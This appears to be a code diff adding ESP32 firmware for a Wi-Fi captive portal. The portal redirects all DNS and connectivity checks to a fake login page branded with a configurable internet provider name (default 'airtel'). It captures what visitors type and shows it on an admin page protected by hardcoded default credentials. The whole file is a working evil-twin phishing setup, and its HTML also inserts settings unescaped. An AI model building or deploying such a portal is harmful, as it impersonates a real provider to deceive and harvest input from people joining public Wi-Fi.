@@ -1,0 +1,251 @@
+#include <WiFi.h>
+#include <ESPAsyncWebServer.h>
+#include <DNSServer.h>
+#include <Preferences.h>
+
+// Security settings - Change these for production
+const char* adminUsername = "admin";
+const char* adminPassword = "admin123";  
+
+// Global objects
+Preferences preferences;
+AsyncWebServer server(80);
+DNSServer dnsServer;
+
+// Network configuration
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 4, 1);
+IPAddress netMask(255, 255, 255, 0);
+
+// Application state variables
+String currentSSID = "ESP32-Captive";
+String selectedISP = "airtel";
+// Store user input in RAM only, volatile
+String lastUserInput = "";
+bool settingsChanged = false;
+
+// Function to escape HTML special characters to prevent injection and display correctly
+String htmlEscape(const String &input) {
+  String escaped = input;
+  escaped.replace("&", "&amp;");
+  escaped.replace("<", "&lt;");
+  escaped.replace(">", "&gt;");
+  escaped.replace("\"", "&quot;"); // fixed
+  escaped.replace("'", "&#39;");
+  return escaped;
+}
+
+void setup() {
+  Serial.begin(115200);
+  delay(100);
+  
+  // Initialize preferences
+  preferences.begin("portal", false);
+
+  // Load saved settings (except user input)
+  currentSSID = preferences.getString("ssid", "ESP32-Captive");
+  selectedISP = preferences.getString("isp", "airtel");
+  
+  Serial.println("Settings loaded from flash (user input in RAM only)");
+
+  // Setup Access Point with proper configuration
+  setupAccessPoint();
+
+  // Small delay to ensure AP is ready
+  delay(100);
+
+  // Setup DNS server for captive portal
+  setupDNSServer();
+
+  // Setup web server routes
+  setupWebServerRoutes();
+
+  // Start web server
+  server.begin();
+  
+  Serial.println("=== ESP32 Captive Portal Started ===");
+  Serial.printf("SSID: %s\n", currentSSID.c_str());
+  Serial.printf("IP: %s\n", apIP.toString().c_str());
+  Serial.printf("Selected ISP: %s\n", selectedISP.c_str());
+  Serial.println("=====================================");
+}
+
+void loop() {
+  // Process DNS requests for captive portal functionality
+  dnsServer.processNextRequest();
+
+  // Handle flash settings changes (SSID and ISP only)
+  if (settingsChanged) {
+    saveSettings();
+    settingsChanged = false;
+  }
+
+  // Small delay to prevent watchdog issues
+  delay(1);
+}
+
+void saveSettings() {
+  preferences.putString("ssid", currentSSID);
+  preferences.putString("isp", selectedISP);
+  Serial.println("Settings saved to flash");
+}
+
+void setupAccessPoint() {
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+  WiFi.mode(WIFI_AP);
+  if (!WiFi.softAPConfig(apIP, apIP, netMask)) {
+    Serial.println("Failed to configure Access Point");
+    return;
+  }
+  if (!WiFi.softAP(currentSSID.c_str())) {
+    Serial.println("Failed to create Access Point");
+    return;
+  }
+  Serial.printf("Access Point '%s' started successfully\n", currentSSID.c_str());
+}
+
+void setupDNSServer() {
+  if (!dnsServer.start(DNS_PORT, "*", apIP)) {
+    Serial.println("Failed to start DNS server");
+    return;
+  }
+  Serial.println("DNS server started for captive portal");
+}
+
+void setupWebServerRoutes() {
+  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request) {
+    if (!request->authenticate(adminUsername, adminPassword)) {
+      return request->requestAuthentication();
+    }
+    serveAdminPage(request);
+  });
+
+  server.on("/admin-update", HTTP_POST, [](AsyncWebServerRequest *request) {
+    if (!request->authenticate(adminUsername, adminPassword)) {
+      return request->requestAuthentication();
+    }
+    handleAdminUpdate(request);
+  });
+
+  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {
+    handleUserSubmission(request);
+  });
+
+  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
+    serveISPLoginPage(request);
+  });
+
+  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request){
+    serveISPLoginPage(request);
+  });
+
+  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){
+    serveISPLoginPage(request);
+  });
+
+  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
+    serveISPLoginPage(request);
+  });
+
+  server.onNotFound([](AsyncWebServerRequest *request) {
+    Serial.printf("Redirecting %s to captive portal\n", request->url().c_str());
+    serveISPLoginPage(request);
+  });
+}
+
+void serveAdminPage(AsyncWebServerRequest *request) {
+  String html = generateAdminHTML();
+  request->send(200, "text/html", html);
+}
+
+void handleAdminUpdate(AsyncWebServerRequest *request) {
+  bool changed = false;
+
+  if (request->hasParam("ssid", true)) {
+    String newSSID = request->getParam("ssid", true)->value();
+    newSSID.trim();
+    if (newSSID.length() > 0 && newSSID != currentSSID) {
+      currentSSID = newSSID;
+      changed = true;
+      Serial.printf("SSID changed to: %s\n", currentSSID.c_str());
+
+      // Restart AP and DNS to apply changes
+      setupAccessPoint();
+      setupDNSServer();
+    }
+  }
+
+  if (request->hasParam("isp", true)) {
+    String newISP = request->getParam("isp", true)->value();
+    if (newISP != selectedISP) {
+      selectedISP = newISP;
+      changed = true;
+      Serial.printf("ISP changed to: %s\n", selectedISP.c_str());
+    }
+  }
+
+  if (changed) {
+    settingsChanged = true;
+  }
+
+  request->redirect("/admin");
+}
+
+void handleUserSubmission(AsyncWebServerRequest *request) {
+  if (request->hasParam("userinput", true)) {
+    String newInput = request->getParam("userinput", true)->value();
+    newInput.trim();
+
+    if (newInput != lastUserInput) {
+      lastUserInput = newInput;  // Only stored in RAM
+      Serial.printf("New user input received (RAM only): %s\n", lastUserInput.c_str());
+    }
+  }
+
+  String response =
+    "<html><body><h2>Submitted Successfully!</h2>"
+    "<p>Your information has been received.</p>"
+    "</body></html>";
+
+  request->send(200, "text/html", response);
+}
+
+void serveISPLoginPage(AsyncWebServerRequest *request) {
+  String html = generateISPLoginHTML();
+  request->send(200, "text/html", html);
+}
+
+// ===== HTML functions =====
+
+String generateAdminHTML() {
+  String html = "<!DOCTYPE html><html><head><title>Admin Portal</title></head><body>";
+  html += "<h2>Admin Settings</h2>";
+  html += "<form method='POST' action='/admin-update'>";
+  html += "SSID: <input type='text' name='ssid' value='" + currentSSID + "'><br><br>";
+  html += "ISP: <input type='text' name='isp' value='" + selectedISP + "'><br><br>";
+  html += "<input type='submit' value='Save'>";
+  html += "</form><br>";
+  
+  // Display last user input escaped for HTML safety
+  html += "<h3>Last User Input:</h3>";
+  if (lastUserInput.length() > 0) {
+    html += "<p>" + htmlEscape(lastUserInput) + "</p>";
+  } else {
+    html += "<p>No input received yet.</p>";
+  }
+
+  html += "</body></html>";
+  return html;
+}
+
+String generateISPLoginHTML() {
+  String html = "<!DOCTYPE html><html><head><title>" + selectedISP + " Login</title></head><body>";
+  html += "<h2>Welcome to " + selectedISP + " Login</h2>";
+  html += "<form method='POST' action='/submit'>";
+  html += "Enter Username: <input type='text' name='userinput' required><br><br>";
+  html += "<input type='submit' value='Submit'>";
+  html += "</form>";
+  html += "</body></html>";
+  return html;
+}
